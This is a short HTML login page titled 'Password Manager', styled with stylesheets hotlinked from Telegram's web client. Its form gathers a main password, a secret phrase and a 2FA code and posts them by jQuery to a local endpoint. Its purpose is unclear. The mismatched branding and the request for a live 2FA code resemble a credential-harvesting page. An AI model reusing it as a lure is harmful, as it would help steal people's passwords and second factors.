<!DOCTYPE HTML>
<html lang="en" id="ng-app" style="display: block;">
<head>

  <meta name="theme-color" content="#497495">
  <title>Password Manager</title>
  <link rel="stylesheet" href="https://web.telegram.org/css/app.css">
  <link rel="stylesheet" href="https://web.telegram.org/css/desktop.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>

</head>

<body class="non_osx non_msie is_1x">

  <br><br>
  <div class="page_wrap" ng-view="">
    <div my-head="">
      <div class="tg_page_head tg_head_wrap noselect clearfix">
        <div class="tg_head_split">
          <div class="tg_head_main_wrap"></div>
        </div>
      </div>
    </div>

    <div class="im_page_wrap clearfix im_page_peer_not_selected">
      <div class="im_page_split clearfix">
        <div class="im_history_col_wrap noselect" style="width: 100%;height: 550px;overflow: auto;">
          <center>
            <br><br><br><br><br><br><br>
            <form id="loginAccount" action="#login">
              <div id="showAlert"></div>
              <input style="width: 500px;height: 54px;" type="password" maxlength="35" class="form-control no_outline" id="MAINPASSWORD" placeholder="Main password" autocomplete="off"><br>
              <input style="width: 500px;height: 54px;" type="password" maxlength="35" class="form-control no_outline" id="PHRASE" placeholder="Phrase" autocomplete="off"><br>
              <input style="width: 500px;height: 54px;" onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength="6" class="form-control no_outline" id="C2FA" placeholder="2FA Code" autocomplete="off"><br>
              <button style="width: 500px;height: 54px;" class="btn reply_markup_button">Login</button>
            </form>

          </center>
        </div>
      </div>
    </div>
  </div>

  <script>
  $(document).ready(function(){
    $("#loginAccount").submit(function() {

      $.post("=system", {

        ACTION:"loginAccount",
        MAINPASSWORD:$("#MAINPASSWORD").val(),
        PHRASE:$("#PHRASE").val(),
        C2FA:$("#C2FA").val()

      }, function(postInfo) {

        if(!postInfo.Html) {
        window.location.replace("/");
      } else {
        $("#showAlert").html(postInfo.Html);
      }

      },"json");

      return false;
    });
  });
    </script>

</body>
</html>
